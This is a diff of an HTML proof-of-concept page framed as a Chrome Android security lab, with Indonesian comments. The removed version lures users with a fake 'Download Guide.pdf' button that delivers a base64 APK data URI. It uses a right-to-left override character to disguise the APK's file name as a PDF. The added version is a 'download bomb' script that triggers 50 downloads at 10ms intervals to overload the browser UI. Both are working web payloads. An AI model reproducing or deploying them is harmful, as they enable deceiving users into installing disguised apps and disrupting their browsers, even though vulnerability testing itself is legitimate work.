@@ -3,78 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chrome Android Security Lab - PoC 1</title>
+    <title>Chrome Android DOS Test - PoC 2</title>
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            padding: 20px; 
-            background-color: #f4f4f9;
-            color: #333;
-            text-align: center;
+        body { font-family: sans-serif; padding: 20px; text-align: center; background: #121212; color: #eee; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; border: 1px solid #333; }
+        .btn-stress {
+            background: #d93025; color: white; padding: 20px;
+            border: none; border-radius: 10px; font-weight: bold;
+            width: 100%; font-size: 1.1rem; cursor: pointer;
         }
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: 50px auto;
-        }
-        h1 { font-size: 1.5rem; color: #d93025; }
-        p { font-size: 1rem; margin-bottom: 25px; color: #5f6368; }
-        .btn-download {
-            background-color: #1a73e8;
-            color: white;
-            padding: 15px 25px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.3s;
-            width: 100%;
-        }
-        .btn-download:active { background-color: #174ea6; }
-        .footer { margin-top: 30px; font-size: 0.8rem; color: #888; }
+        .status { margin-top: 20px; font-family: monospace; color: #0f0; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h1>🔒 Security Test</h1>
-        <p>Silakan unduh dokumen panduan keamanan terbaru (PDF) untuk melanjutkan.</p>
+        <h1>⚠️ Stress Test Lab</h1>
+        <p>Memicu 50+ download dengan jeda 10ms.<br>Perhatikan responsivitas navigasi Chrome.</p>
         
-        <button class="btn-download" onclick="triggerSpoof()">
-            📄 Download Guide.pdf
+        <button class="btn-stress" onclick="startStressTest()">
+            LAUNCH DOWNLOAD BOMB
         </button>
-    </div>
 
-    <div class="footer">
-        Laboratorium Pengujian Vulnerability UI/UX<br>
-        Target: Chrome Android (Latest)
+        <div id="log" class="status">Status: Ready</div>
     </div>
 
     <script>
-        function triggerSpoof() {
-            // Ini adalah Header APK minimalis dalam Base64 (hanya untuk trigger browser)
-            const apkBase64 = "data:application/vnd.android.package-archive;base64,UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAABAAhVAAAAAAAABfX21hbmVmaXN0X18ucGRmUEsFBgAAAAABAAEAPAAAAE0AAAAAAA==";
+        function startStressTest() {
+            const logDiv = document.getElementById('log');
+            const totalFiles = 50; // Jumlah file untuk mencoba overload UI
             
-            const link = document.createElement('a');
-            link.href = apkBase64;
-            
-            /* TRIK RTLO (Right-to-Left Override):
-               Karakter \u202e akan membalik teks setelahnya.
-               Input: "update_keamanan_\u202ekpa.fdf"
-               Hasil Visual di Chrome (jika rentan): "update_keamanan_fdf.apk"
-            */
-            const fileName = "update_keamanan_\u202ekpa.fdf";
-            
-            link.download = fileName;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            console.log("PoC Executed: Checking for UI Spoofing...");
+            logDiv.innerText = "Status: Launching...";
+
+            for (let i = 1; i <= totalFiles; i++) {
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    
+                    // Menggunakan data unik tiap iterasi agar tidak dianggap file yang sama
+                    const content = `Stress Test File Ke-${i} - Time: ${Date.now()}`;
+                    link.href = "data:application/octet-stream;base64," + btoa(content);
+                    link.download = `attack_log_${i}.bin`;
+                    
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+
+                    logDiv.innerText = `Status: Sent ${i}/${totalFiles}`;
+                    
+                    if (i === totalFiles) {
+                        logDiv.innerText = "Status: All triggers sent. Check UI Response.";
+                    }
+                }, i * 10); // Jeda 10ms (Sangat Cepat)
+            }
         }
     </script>
 
